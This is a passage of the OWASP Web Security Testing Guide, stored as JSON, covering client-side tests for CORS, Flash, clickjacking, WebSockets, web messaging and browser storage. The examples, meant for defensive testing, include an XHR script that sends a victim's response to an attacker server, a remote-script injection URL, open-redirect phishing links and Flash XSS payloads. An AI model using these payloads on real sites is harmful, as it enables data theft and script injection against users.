        "how-to": "<h3>How to Test</h3><p>A tool such as ZAP can enable testers to intercept HTTP headers, which can reveal how CORS is used. Testers should pay particular attention to the origin header to learn which domains are allowed. Also, in some cases, manual inspection of the JavaScript is needed to determine whether the code is vulnerable to code injection due to improper handling of user supplied input.</p><p>Setting the wildcard to the Access-Control-Allow-Origin header (that is, Access-Control-Allow-Origin: * ) is not secure if the response contains sensitive information. Although it cannot be used with the Access-Control-Allow-Credentials: true at the same time, it can be dangerous where the access control is done solely by the firewall rules or the source IP addresses, other than being protected by credentials.</p><p>A tester can check if the Access-Control-Allow-Origin: * exists in the HTTP response messages.</p><pre><code>HTTP / 1.1 200 OK [...] Access-Control-Allow-Origin : * Content-Length : 4 Content-Type : application/xml [Response Body]</code></pre><p>If a response contains sensitive data, an attacker can steal it through the usage of XHR:</p><pre><code><html> <head></head> <body> <script> var xhr = new XMLHttpRequest (); xhr . onreadystatechange = function () { if ( this . readyState == 4 && this . status == 200 ) { var xhr2 = new XMLHttpRequest (); // attacker.server: attacker listener to steal response xhr2 . open ( \" POST \" , \" https://attacker.server \" , true ); xhr2 . send ( xhr . responseText ); } }; // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header xhr . open ( \" GET \" , \" https://victim.site \" , true ); xhr . send (); </script> </body> </html></code></pre><p>A modern web application or API may be implemented to allow cross-origin requests dynamically, generally in order to allow the requests from the sub domains like the following:</p><pre><code>if ( preg_match ( '|\\.example.com$|' , $_SERVER [ 'SERVER_NAME' ])) { header ( \"Access-Control-Allow-Origin: { $_SERVER [ 'HTTP_ORIGIN' ] } \" ); ... }</code></pre><p>In this example, all the requests from the subdomains of example.com will be allowed. It must be ensured that the regular expression that is used to match is complete. Otherwise, if it was simply matched with example.com (without $ appended), attackers might be able to bypass the CORS policy by appending their domain to the Origin header.</p><pre><code>GET /test.php HTTP / 1.1 Host : example.com [...] Origin : https://example.com.attacker.com Cookie : <session cookie></code></pre><p>When the request above is sent, if the following response is returned with the Access-Control-Allow-Origin whose value is the same as the attacker’s input, the attacker can read the response afterwards and access sensitive information that is only accessible by a victim user.</p><pre><code>HTTP / 1.1 200 OK [...] Access-Control-Allow-Origin : https://example.com.attacker.com Access-Control-Allow-Credentials : true Content-Length : 4 Content-Type : application/xml [Response Body]</code></pre><p>The CORS concept can be viewed from a completely different angle. An attacker may allow their CORS policy on purpose to inject code to the target web application.</p><p>This code makes a request to the resource passed after the # character in the URL, initially used to get resources in the same server.</p><p>Vulnerable code:</p><pre><code><script> var req = new XMLHttpRequest (); req . onreadystatechange = function () { if ( req . readyState == 4 && req . status == 200 ) { document . getElementById ( \" div1 \" ). innerHTML = req . responseText ; } } var resource = location . hash . substring ( 1 ); req . open ( \" GET \" , resource , true ); req . send (); </script> <body> <div id= \"div1\" ></div> </body></code></pre><p>For example, a request like this will show the contents of the profile.php file:</p><p>https://example.foo/main.php#profile.php</p><p>Request and response generated by https://example.foo/profile.php :</p><pre><code>GET /profile.php HTTP/1.1\nHost: example.foo\n[...]\nReferer: https://example.foo/main.php\nConnection: keep-alive\n\nHTTP/1.1 200 OK\n[...]\nContent-Length: 25\nContent-Type: text/html\n\n[Response Body]</code></pre><p>Now, as there is no URL validation we can inject a remote script, that will be injected and executed in the context of the example.foo domain, with a URL like this:</p><pre><code>https://example.foo/main.php#https://attacker.bar/file.php</code></pre><p>Request and response generated by https://attacker.bar/file.php :</p><pre><code>GET /file.php HTTP/1.1\nHost: attacker.bar\n[...]\nReferer: https://example.foo/main.php\norigin: https://example.foo\n\nHTTP/1.1 200 OK\n[...]\nAccess-Control-Allow-Origin: *\nContent-Length: 92\nContent-Type: text/html\n\nInjected Content from attacker.bar <img src= \"#\" onerror= \"alert('Domain: '+document.domain)\" ></code></pre><h3>References</h3><ul><li>OWASP HTML5 Security Cheat Sheet</li><li>MDN Cross-Origin Resources Sharing</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CLNT-08": {
        "summary": "<h3>Summary</h3><p>ActionScript, based on ECMAScript, is the language used by Flash applications when dealing with interactive needs. There are three versions of the ActionScript language. ActionScript 1.0 and ActionScript 2.0 are very similar with ActionScript 2.0 being an extension of ActionScript 1.0. ActionScript 3.0, introduced with Flash Player 9, is a rewrite of the language to support object orientated design.</p><p>ActionScript, like every other language, has some implementation patterns which could lead to security issues. In particular, since Flash applications are often embedded in browsers, vulnerabilities like DOM-based Cross Site Scripting (DOM XSS) could be present in flawed Flash applications.</p><p>Cross-Site Flashing (XSF) is a vulnerability that has a similar impact to XSS.</p><p>XSF occurs when the following scenarios are initiated from different domains:</p><ul><li>One movie loads another movie withloadMovie*functions (or other hacks) and has access to the same sandbox, or part of it.</li><li>An HTML page uses JavaScript to command an Adobe Flash movie, for example, by calling:GetVariableto access Flash public and static objects from JavaScript as a string.SetVariableto set a static or public Flash object to a new string value with JavaScript.</li><li>GetVariableto access Flash public and static objects from JavaScript as a string.</li><li>SetVariableto set a static or public Flash object to a new string value with JavaScript.</li><li>Unexpected communications between the browser and SWF application, which could result in stealing data from the SWF application.</li></ul><ul><li>GetVariableto access Flash public and static objects from JavaScript as a string.</li><li>SetVariableto set a static or public Flash object to a new string value with JavaScript.</li></ul><p>XSF may be performed by forcing a flawed SWF to load an external evil Flash file. This attack could result in XSS or in the modification of the GUI in order to fool a user to insert credentials on a fake Flash form. XSF could be used in the presence of Flash HTML Injection or external SWF files when loadMovie* methods are used.</p><p>SWFs have the capability to navigate the browser. If the SWF takes the destination in as a FlashVar, then the SWF may be used as an open redirector. An open redirector is any piece of website functionality on a trusted website that an attacker can use to redirect the end user to a malicious website. These are frequently used within phishing attacks. Similar to cross-site scripting, the attack involves a user clicking on a malicious link.</p><p>In the Flash case, the malicious URL might look like:</p><pre><code>https://trusted.example.org/trusted.swf?getURLValue=https://www.evil-spoofing-website.org/phishEndUsers.html</code></pre><p>In the above example, an end user might see that the URL begins with their favorite trusted website and click on it. The link would load the trusted SWF which takes the getURLValue and provides it to an ActionScript browser navigation call:</p><pre><code>getURL ( _root . getURLValue , \"_self\" ) ;</code></pre><p>This would navigate the browser to the malicious URL provided by the attacker. At this point, the phisher has successfully leveraged the trust the user has in trusted.example.org to trick the user into visiting their malicious website. From there, they could launch a 0-day, conduct spoofing of the original website, or any other type of attack. SWFs may unintentionally be acting as an open-redirector on the website.</p><p>Developers should avoid taking full URLs as FlashVars. If they only plan to navigate within their own website, then they should use relative URLs or verify that the URL begins with a trusted domain and protocol.</p><p>Since May 2007, three new versions of Flash Player were released by Adobe. Every new version restricts some of the attacks previously described.</p><h3>Test Objectives</h3><ul><li>Decompile and analyze the application’s code.</li><li>Assess sinks inputs and unsafe method usages.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Since the first publication of “Testing Flash Applications”, new versions of Flash Player were released in order to mitigate some of the attacks which will be described. Nevertheless, some issues still remain exploitable because they are the result of insecure programming practices.</p><p>Since SWF files are interpreted by a virtual machine embedded in the player itself, they can be potentially decompiled and analyzed. The most known and free ActionScript 2.0 decompiler is flare.</p><p>To decompile a SWF file with flare just type:</p><p>$ flare hello.swf</p><p>This results in a new file called hello.flr.</p><p>Decompilation helps testers because it allows for white-box testing of the Flash applications. A quick web search can lead you to various disassemblers and flash security tools.</p><p>FlashVars are the variables that the SWF developer planned on receiving from the web page. FlashVars are typically passed in from the Object or Embed tag within the HTML. For instance:</p><pre><code><object width= \"550\" height= \"400\" classid= \"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" codebase= \"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0\" > <param name= \"movie\" value= \"somefilename.swf\" > <param name= \"FlashVars\" value= \"var1=val1&var2=val2\" > <embed src= \"somefilename.swf\" width= \"550\" height= \"400\" FlashVars= \"var1=val1&var2=val2\" > </embed> </object></code></pre><p>FlashVars can also be initialized from the URL:</p><p>https://www.example.org/somefilename.swf?var1=val1&var2=val2</p><p>In ActionScript 3.0, a developer must explicitly assign the FlashVar values to local variables. Typically, this looks like:</p><pre><code>var paramObj : Object = LoaderInfo ( this . root . loaderInfo ). parameters ; var var1 : String = String ( paramObj [ \"var1\" ]) ; var var2 : String = String ( paramObj [ \"var2\" ]) ;</code></pre><p>In ActionScript 2.0, any uninitialized global variable is assumed to be a FlashVar. Global variables are those variables that are prepended by _root , _global or _level0 . This means that if an attribute like _root.varname is undefined throughout the code flow, it could be overwritten by URL parameters:</p><p>https://victim/file.swf?varname=value</p><p>Regardless of whether you are looking at ActionScript 2.0 or ActionScript 3.0, FlashVars can be a vector of attack. Let’s look at some ActionScript 2.0 code that is vulnerable:</p><p>Example:</p><pre><code>movieClip 328 __Packages . Locale { # initclip if ( ! _global . Locale ) { var v1 = function ( on_load ) { var v5 = new XML () ; var v6 = this ; v5 . onLoad = function ( success ) { if ( success ) { trace ( 'Locale loaded xml' ) ; var v3 = this . xliff . file . body . $trans_unit ; var v2 = 0 ; while ( v2 < v3 . length ) { Locale . strings [ v3 [ v2 ]. _resname ] = v3 [ v2 ]. source . __text ; ++ v2 ; } on_load () ; } else {} } ; if ( _root . language != undefined ) { Locale . DEFAULT_LANG = _root . language ; } v5 . load ( Locale . DEFAULT_LANG + '/player_' + Locale . DEFAULT_LANG + '.xml' ) ; } ;</code></pre><p>The above code could be attacked by requesting:</p><p>https://victim/file.swf?language=https://evil.example.org/malicious.xml?</p><p>When an entry point is identified, the data it represents could be used by unsafe methods. If the data is not filtered or validated, it could lead to some vulnerabilities.</p><p>Unsafe Methods since version r47 are:</p><ul><li>loadVariables()</li><li>loadMovie()</li><li>getURL()</li><li>loadMovie()</li><li>loadMovieNum()</li><li>FScrollPane.loadScrollContent()</li><li>LoadVars.load</li><li>LoadVars.send</li><li>XML.load( 'url' )</li><li>LoadVars.load( 'url' )</li><li>Sound.loadSound( 'url' , isStreaming );</li><li>NetStream.play( 'url' );</li><li>flash.external.ExternalInterface.call(_root.callback)</li><li>htmlText</li></ul><p>The swf file should be hosted on the victim’s host, and the techniques of reflected XSS must be used. An attacker forces the browser to load a pure swf file directly in the location bar (by redirection or social engineering) or by loading it through an iframe from an evil page:</p><pre><code><iframe src= 'https://victim/path/to/file.swf' ></iframe></code></pre><p>In this situation, the browser will self-generate an HTML page as if it were hosted by the victim host.</p><p>The GetURL function in ActionScript 2.0 and NavigateToURL in ActionScript 3.0 lets the movie load a URI into the browser’s window. If an undefined variable is used as the first argument for getURL:</p><p>getURL(_root.URI,'_targetFrame');</p><p>Or if a FlashVar is used as the parameter that is passed to a navigateToURL function:</p><pre><code>var request : URLRequest = new URLRequest ( FlashVarSuppliedURL ) ; navigateToURL ( request ) ;</code></pre><p>Then this will mean it’s possible to call JavaScript in the same domain where the movie is hosted by requesting:</p><p>https://victim/file.swf?URI=javascript:evilcode</p><p>getURL('javascript:evilcode','_self');</p><p>The same is possible when only some part of getURL is controlled via DOM injection with Flash JavaScript injection:</p><pre><code>getUrl ( ' javascript:function( ' + _root . arg + ' ) ' )</code></pre><p>You can use the special asfunction protocol to cause the link to execute an ActionScript function in a SWF file instead of opening a URL. Until release Flash Player 9 r48 asfunction could be used on every method which has a URL as an argument. After that release, asfunction was restricted to use within an HTML TextField.</p><p>This means that a tester could try to inject:</p><pre><code>asfunction : getURL , javascript : evilcode</code></pre><p>in every unsafe method, such as:</p><pre><code>loadMovie ( _root . URL )</code></pre><p>by requesting:</p><p>https://victim/file.swf?URL=asfunction:getURL,javascript:evilcode</p><p>ExternalInterface.call is a static method introduced by Adobe to improve player/browser interaction for both ActionScript 2.0 and ActionScript 3.0.</p><p>From a security point of view it could be abused when part of its argument could be controlled:</p><pre><code>flash . external . ExternalInterface . call ( _root . callback ) ;</code></pre><p>the attack pattern for this kind of flaw may be something like the following:</p><pre><code>eval ( evilcode )</code></pre><p>since the internal JavaScript that is executed by the browser will be something similar to:</p><pre><code>eval ( ' try { __flash__toXML( ' + __root . callback + ' ) ; } catch (e) { \"<undefined/>\"; } ' )</code></pre><p>TextField Objects can render minimal HTML by setting:</p><pre><code>tf . html = true tf . htmlText = '<tag>text</tag>'</code></pre><p>So if some part of text could be controlled by the tester, an <a> tag or an image tag could be injected resulting in modifying the GUI or a XSS attack on the browser.</p><p>Some attack examples with <a> tag:</p><ul><li>Direct XSS:<a href='javascript:alert(123)'></li><li>Call a function:<a href='asfunction:function,arg'></li><li>Call SWF public functions:<a href='asfunction:_root.obj.function, arg'></li><li>Call native static as function:<a href='asfunction:System.Security.allowDomain,evilhost'></li></ul><p>An image tag could be used as well:</p><pre><code><img src= 'https://evil/evil.swf' ></code></pre><p>In this example, .swf is necessary to bypass the Flash Player internal filter:</p><pre><code><img src= 'javascript:evilcode//.swf' ></code></pre><p>Since the release of Flash Player 9.0.124.0, XSS is no longer exploitable, but GUI modification could still be accomplished.</p><p>The following tools may be helpful in working with SWF:</p><ul><li>OWASP SWFIntruder</li><li>Disassembler – Flasm</li><li>Swfmill – Convert Swf to XML and vice versa</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CLNT-09": {
        "summary": "<h3>Summary</h3><p>Clickjacking, a subset of UI redressing, is a malicious technique whereby a web user is deceived into interacting (in most cases by clicking) with something other than what the user believes they are interacting with. This type of attack, either alone or in conjunction with other attacks, could potentially send unauthorized commands or reveal confidential information while the victim is interacting with seemingly-harmless web pages. The term clickjacking was coined by Jeremiah Grossman and Robert Hansen in 2008.</p><p>A clickjacking attack uses seemingly-harmless features of HTML and JavaScript to force the victim to perform undesired actions, such as clicking an invisible button that performs an unintended operation. This is a client-side security issue that affects a variety of browsers and platforms.</p><p>To carry out this attack, an attacker creates a seemingly-harmless web page that loads the target application through the use of an inline frame (concealed with CSS code). Once this is done, an attacker may induce the victim to interact with the web page by other means (through, for example, social engineering). Like other attacks, a common prerequisite is that the victim is authenticated against the attacker’s target application.</p><p>Figure 4.11.9-1: Clickjacking inline frame illustration</p><br><p>The victim surfs the attacker’s web page with the intention of interacting with the visible user interface, but is inadvertently performing actions on the hidden web page. Using the hidden page, an attacker can deceive users into performing actions they never intended to perform through the positioning of the hidden elements in the web page.</p><p>Figure 4.11.9-2: Masked inline frame illustration</p><br><p>The power of this method is that the actions performed by the victim are originated from the hidden but authentic target web page. Consequently, some of the anti-CSRF protections deployed by the developers to protect the web page from CSRF attacks could be bypassed.</p><h3>Test Objectives</h3><ul><li>Assess application vulnerability to clickjacking attacks.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>As mentioned above, this type of attack is often designed to allow an attacker to induce users’ actions on the target site, even if anti-CSRF tokens are being used.</p><p>Sites that do not protected against frame busting are vulnerable to clickjacking attack. If the https://www.target.site web page is successfully loaded into a frame, then the site is vulnerable to Clickjacking. An example of HTML code to create this testing web page is displayed in the following snippet:</p><pre><code><html>\n        <head>\n            <title>Clickjack test web page</title>\n        </head>\n        <body>\n            <iframe src=\"https://www.target.site\" width=\"400\" height=\"400\"></iframe>\n        </body>\n    </html></code></pre><p>Since these types of client-side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism against clickjacking.</p><p>There are few deactivation techniques that can be used with frames. More in depth techniques can be found on the Clickjacking Defense Cheat Sheet .</p><p>With HTML5 a new attribute called “sandbox” is available. It enables a set of restrictions on content loaded into the iframe.</p><p>Example:</p><pre><code><iframe src= \"https://example.org\" sandbox ></iframe></code></pre><p>Mobile versions of the web page are usually smaller and faster than the desktop ones, and they have to be less complex than the main application. Mobile variants often have less protection. However, an attacker can fake the real origin given by a web browser, and a non-mobile victim may be able to visit an application made for mobile users. This scenario could allow the attacker to exploit a mobile version of the web page.\nApplications running on acessibility mode should also be tested against clickjacking, because site framming could be affected.</p><p>The HTTP Content-Security-Policy (CSP) response header allows web page administrators to control resources the user agent is allowed to load for a given web page. The frame-ancestors directive in the HTTP CSP specifies the acceptable parents that may embed a web page using the <frame> , <iframe> , <object> , <embed> , or <applet> tags.</p><ul><li>Using a browser, open developer tools and access the target web page. Navigate to the Network tab.</li><li>Look for the request that loads the web page. It should have the same domain as the web page - usually be the first item on the Network tab.</li><li>Once you click on the file, more information will come up. Look for a 200 OK response code.</li><li>Scroll down to the Response Header Section. Content-Security-Policy section indicates level of protecting adopted.</li></ul><p>Alternatively view the web page source to find Content-Security-Policy in a meta tag. WSTG has a detailed information on Test for Content Security Policy .</p><p>Web proxies are known for adding and stripping headers. In the case in which a web proxy strips the X-FRAME-OPTIONS header then the site loses its framing protection.</p><p>In this case, because the X-FRAME-OPTIONS HTTP header has to be implemented in every page of the application, developers may have not protected every single page on the mobile version.</p><ul><li>For measures to prevent Clickjacking, see theClickjacking Defense Cheat Sheet.</li><li>For interactive labs on Clickjacking visitPort Swigger Web Page</li><li>For additional resources on ClickJacking visit theOWASP community</li></ul><h3>References</h3><ul><li>OWASP Clickjacking</li><li>Wikipedia Clickjacking</li><li>Gustav Rydstedt, Elie Bursztein, Dan Boneh, and Collin Jackson: “Busting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites”</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CLNT-10": {
        "summary": "<h3>Summary</h3><p>Traditionally, the HTTP protocol only allows one request/response per TCP connection. Asynchronous JavaScript and XML (AJAX) allows clients to send and receive data asynchronously (in the background without a page refresh) to the server, however, AJAX requires the client to initiate the requests and wait for the server responses (half-duplex).</p><p>WebSockets allow the client or server to create a ‘full-duplex’ (two-way) communication channel, allowing the client and server to truly communicate asynchronously. WebSockets conduct their initial upgrade handshake over HTTP and from then on all communication is carried out over TCP channels by use of frames. For more, see the WebSocket Protocol .</p><p>It is the server’s responsibility to verify the Origin header in the initial HTTP WebSocket handshake. If the server does not validate the origin header in the initial WebSocket handshake, the WebSocket server may accept connections from any origin. This could allow attackers to communicate with the WebSocket server cross-domain allowing for CSRF-like issues. See also Top 10-2017 A5-Broken Access Control . The exploit for this weakness is called Cross-Site Websocket Hijacking (CSWH or CSWSH).</p><p>WebSockets can be used over unencrypted TCP or over encrypted TLS. To use unencrypted WebSockets the ws:// URI scheme is used (default port 80), to use encrypted (TLS) WebSockets the wss:// URI scheme is used (default port 443). See also Top 10-2017 A3-Sensitive Data Exposure .</p><p>As with any data originating from untrusted sources, the data should be properly sanitized and encoded. See also Top 10-2017 A1-Injection and Top 10-2017 A7-Cross-Site Scripting (XSS) .</p><h3>Test Objectives</h3><ul><li>Identify the usage of WebSockets.</li><li>Assess its implementation by using the same tests on normal HTTP channels.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>Inspect the client-side source code for thews://orwss://URI scheme.</li><li>Use Google Chrome’s Developer Tools to view the Network WebSocket communication.</li><li>UseZAP’sWebSocket tab.</li></ul><ul><li>Using a WebSocket client (one can be found in the Tools section below) attempt to connect to the remote WebSocket server. If a connection is established the server may not be checking the origin header of the WebSocket handshake.</li></ul><ul><li>Check that the WebSocket connection is using TLS to transport sensitive informationwss://.</li><li>Check the HTTPS Implementation for security issues (Valid Certificate, BEAST, CRIME, RC4, etc). Refer to theTesting for Weak Transport Layer Securitysection of this guide.</li></ul><ul><li>WebSockets do not handle authentication, normal black-box authentication tests should be carried out. Refer to theAuthentication Testingsections of this guide.</li></ul><ul><li>WebSockets do not handle authorization, normal black-box authorization tests should be carried out. Refer to theAuthorization Testingsections of this guide.</li></ul><ul><li>UseZAP’sWebSocket tab to replay and fuzz WebSocket request and responses. Refer to theTesting for Data Validationsections of this guide.</li></ul><p>Once we have identified that the application is using WebSockets (as described above) we can use the Zed Attack Proxy (ZAP) to intercept the WebSocket request and responses. ZAP can then be used to replay and fuzz the WebSocket request/responses.</p><p>Figure 4.11.10-1: ZAP WebSockets</p><br><p>Using a WebSocket client (one can be found in the Tools section below) attempt to connect to the remote WebSocket server. If the connection is allowed the WebSocket server may not be checking the WebSocket handshake’s origin header. Attempt to replay requests previously intercepted to verify that cross-domain WebSocket communication is possible.</p><p>Figure 4.11.10-2: WebSocket Client</p><br><p>Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. The only difference here is that you may have API documentation for the application being tested which includes the expected WebSocket request and responses.</p>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)</li><li>WebSocket Client</li><li>Google Chrome Simple WebSocket Client</li></ul><h3>References</h3><ul><li>HTML5 Rocks - Introducing WebSockets: Bringing Sockets to the Web</li><li>W3C - The WebSocket API</li><li>IETF - The WebSocket Protocol</li><li>CWE-1385: Missing Origin Validation in WebSockets</li><li>Christian Schneider - Cross-Site WebSocket Hijacking (CSWSH)</li><li>Robert Koch- On WebSockets in Penetration Testing</li><li>DigiNinja - ZAP and Web Sockets</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CLNT-11": {
        "summary": "<h3>Summary</h3><p>Web Messaging (also known as Cross Document Messaging ) allows applications running on different domains to communicate in a secure manner. Before the introduction of web messaging, the communication of different origins (between iframes, tabs and windows) was restricted by the same origin policy and enforced by the browser. Developers used multiple hacks in order to accomplish these tasks, and most of them were mainly insecure.</p><p>This restriction within the browser is in place to prevent a malicious website from reading confidential data from other iframes, tabs, etc; however, there are some legitimate cases where two trusted websites need to exchange data with each other. To meet this need, Cross Document Messaging was introduced in the WHATWG HTML5 draft specification and was implemented in all major browsers. It enables secure communications between multiple origins across iframes, tabs and windows.</p><p>The messaging API introduced the postMessage() method , with which plain-text messages can be sent cross-origin. It consists of two parameters: message, and domain.</p><p>There are some security concerns when using * as the domain that we discuss below. In order to receive messages, the receiving website needs to add a new event handler, which has the following attributes:</p><ul><li>Data, the content of the incoming message;</li><li>Origin of the sender document; and</li><li>Source, the source window.</li></ul><p>Here is an example of the messaging API in use. To send a message:</p><pre><code>iframe1 . contentWindow . postMessage ( \" Hello world \" , \" https://www.example.com \" );</code></pre><p>To receive a message:</p><pre><code>window . addEventListener ( \" message \" , handler , true ); function handler ( event ) { if ( event . origin === ' chat.example.com ' ) { /* process message (event.data) */ } else { /* ignore messages from untrusted domains */ } }</code></pre><p>The origin is made up of a scheme, host name, and port. It uniquely identifies the domain sending or receiving the message, and does not include the path or the fragment part of the URL. For instance, https://example.com will be considered different from https://example.com because the schema of the former is https , while the latter is http . This also applies to web servers running in the same domain but on different ports.</p><h3>Test Objectives</h3><ul><li>Assess the security of the message’s origin.</li><li>Validate that it’s using safe methods and validating its input.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Testers should check whether the application code is filtering and processing messages from trusted domains. Within the sending domain, also ensure that the receiving domain is explicitly stated, and that * is not used as the second argument of postMessage() . This practice could introduce security concerns and could lead to, in the case of a redirection or if the origin changes by other means, the website sending data to unknown hosts, and therefore, leaking confidential data to malicious servers.</p><p>If the website fails to add security controls to restrict the domains or origins that are allowed to send messages to a website, it is likely to introduce a security risk. Testers should examine the code for message event listeners and get the callback function from the addEventListener method for further analysis. Domains must always be verified prior to data manipulation.</p><p>Although the website is theoretically accepting messages from trusted domains only, data must still be treated as externally-sourced, untrusted data, and processed with the appropriate security controls. Testers should analyze the code and look for insecure methods, in particular where data is being evaluated via eval() or inserted into the DOM via the innerHTML property, which may create DOM-based XSS vulnerabilities.</p><p>JavaScript code should be analyzed to determine how web messaging is implemented. In particular, testers should be interested in how the website is restricting messages from untrusted domains, and how the data is handled even for trusted domains.</p><p>In this example, access is needed for every subdomain (www, chat, forums, …) within the owasp.org domain. The code is trying to accept any domain with .owasp.org :</p><pre><code>window . addEventListener ( \" message \" , callback , true ); function callback ( e ) { if ( e . origin . indexOf ( \" .owasp.org \" ) !=- 1 ) { /* process message (e.data) */ } }</code></pre><p>The intention is to allow subdomains such as:</p><ul><li>www.owasp.org</li><li>chat.owasp.org</li><li>forums.owasp.org</li></ul><p>Unfortunately, this introduces vulnerabilities. An attacker can easily bypass the filter since a domain such as www.owasp.org.attacker.com will match.</p><p>Here is an example of code that lacks an origin check. This is very insecure, as it will accept input from any domain:</p><pre><code>window . addEventListener ( \" message \" , callback , true ); function callback ( e ) { /* process message (e.data) */ }</code></pre><p>Here is an example with input validation vulnerabilities that may lead to XSS attack:</p><pre><code>window . addEventListener ( \" message \" , callback , true ); function callback ( e ) { if ( e . origin === \" trusted.domain.com \" ) { element . innerHTML = e . data ; } }</code></pre><p>A more secure approach would be to use the property innerText instead of innerHTML .</p><p>For further OWASP resources regarding web messaging, see OWASP HTML5 Security Cheat Sheet</p>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CLNT-12": {
        "summary": "<h3>Summary</h3><p>Browsers provide the following client-side storage mechanisms for developers to store and retrieve data:</p><ul><li>Local Storage</li><li>Session Storage</li><li>IndexedDB</li><li>Web SQL (Deprecated)</li><li>Cookies</li></ul><p>These storage mechanisms can be viewed and edited using the browser’s developer tools, such as Google Chrome DevTools or Firefox’s Storage Inspector .</p><p>Note: While cache is also a form of storage it is covered in a separate section covering its own peculiarities and concerns.</p><h3>Test Objectives</h3><ul><li>Determine whether the website is storing sensitive data in client-side storage.</li><li>The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>window.localStorage is a global property that implements the Web Storage API and provides persistent key-value storage in the browser.</p><p>Both the keys and values can only be strings, so any non-string values must be converted to strings first before storing them, usually done via JSON.stringify .</p><p>Entries to localStorage persist even when the browser window closes, with the exception of windows in Private/Incognito mode.</p><p>The maximum storage capacity of localStorage varies between browsers.</p><pre><code>for ( let i = 0 ; i < localStorage . length ; i ++ ) { const key = localStorage . key ( i ); const value = localStorage . getItem ( key ); console . log ( ` ${ key } : ${ value } ` ); }</code></pre><p>window.sessionStorage is a global property that implements the Web Storage API and provides ephemeral key-value storage in the browser.</p><p>Both the keys and values can only be strings, so any non-string values must be converted to strings first before storing them, usually done via JSON.stringify .</p><p>Entries to sessionStorage are ephemeral because they are cleared when the browser tab/window is closed.</p><p>The maximum storage capacity of sessionStorage varies between browsers.</p><pre><code>for ( let i = 0 ; i < sessionStorage . length ; i ++ ) { const key = sessionStorage . key ( i ); const value = sessionStorage . getItem ( key ); console . log ( ` ${ key } : ${ value } ` ); }</code></pre><p>IndexedDB is a transactional, object-oriented database intended for structured data. An IndexedDB database can have multiple object stores and each object store can have multiple objects.</p><p>In contrast to Local Storage and Session Storage, IndexedDB can store more than just strings. Any objects supported by the structured clone algorithm can be stored in IndexedDB.</p><p>An example of a complex JavaScript object that can be stored in IndexedDB, but not in Local/Session Storage are CryptoKeys .</p><p>W3C recommendation on Web Crypto API recommends that CryptoKeys that need to be persisted in the browser, to be stored in IndexedDB. When testing a web page, look for any CryptoKeys in IndexedDB and check if they are set as extractable: true when they should have been set to extractable: false (i.e. ensure the underlying private key material is never exposed during cryptographic operations.)</p><pre><code>const dumpIndexedDB = dbName => { const DB_VERSION = 1 ; const req = indexedDB . open ( dbName , DB_VERSION ); req . onsuccess = function () { const db = req . result ; const objectStoreNames = db . objectStoreNames || []; console . log ( `[*] Database: ${ dbName } ` ); Array . from ( objectStoreNames ). forEach ( storeName => { const txn = db . transaction ( storeName , ' readonly ' ); const objectStore = txn . objectStore ( storeName ); console . log ( `\\t[+] ObjectStore: ${ storeName } ` ); // Print all entries in objectStore with name `storeName` objectStore . getAll (). onsuccess = event => { const items = event . target . result || []; items . forEach ( item => console . log ( `\\t\\t[-] ` , item )); }; }); }; }; indexedDB . databases (). then ( dbs => dbs . forEach ( db => dumpIndexedDB ( db . name )));</code></pre><p>Web SQL is deprecated since November 18, 2010 and it’s recommended that web developers do not use it.</p><p>Cookies are a key-value storage mechanism that is primarily used for session management but web developers can still use it to store arbitrary string data.</p><p>Cookies are covered extensively in the testing for Cookies attributes scenario.</p><pre><code>console . log ( window . document . cookie );</code></pre><p>Sometimes web developers initialize and maintain global state that is available only during the runtime life of the page by assigning custom attributes to the global window object. For example:</p><pre><code>window . MY_STATE = { counter : 0 , flag : false , };</code></pre><p>Any data attached on the window object will be lost when the page is refreshed or closed.</p><pre><code>(() => { // create an iframe and append to body to load a clean window object const iframe = document . createElement ( ' iframe ' ); iframe . style . display = ' none ' ; document . body . appendChild ( iframe ); // get the current list of properties on window const currentWindow = Object . getOwnPropertyNames ( window ); // filter the list against the properties that exist in the clean window const results = currentWindow . filter ( prop => ! iframe . contentWindow . hasOwnProperty ( prop ) ); // remove iframe document . body . removeChild ( iframe ); // log key-value entries that are different results . forEach ( key => console . log ( ` ${ key } : ${ window [ key ]} ` )); })();</code></pre><p>(Modified version of this snippet )</p><p>Following the identification any of the above attack vectors, an attack chain can be formed with different types of client-side attacks, such as DOM based XSS attacks.</p>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>Applications should be storing sensitive data on the server-side, and not on the client-side, in a secured manner following best practices.</p><h3>References</h3><ul><li>Local Storage</li><li>Session Storage</li><li>IndexedDB</li><li>Web Crypto API: Key Storage</li><li>Web SQL</li><li>Cookies</li></ul><p>For more OWASP resources on the HTML5 Web Storage API, see the Session Management Cheat Sheet .</p>",
        "test_objectives": ""
    },
    "WSTG-CLNT-13": {
